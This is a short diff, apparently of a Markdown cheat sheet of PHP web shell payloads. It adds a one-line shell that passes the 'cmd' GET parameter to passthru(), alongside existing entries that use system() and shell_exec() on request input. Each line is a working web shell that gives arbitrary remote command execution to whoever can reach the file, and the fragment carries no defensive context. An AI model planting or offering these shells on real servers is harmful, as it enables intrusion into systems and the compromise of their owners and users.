@@ -163,7 +163,11 @@
   ```php
   <?php system($_GET['cmd']); ?>
   ```
-  
+   
+  ```php
+  <?php passthru($_GET['cmd']); ?>
+  ```
+   
   # <kbd>Basic Proportions OK</kbd>
   ```php
   <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
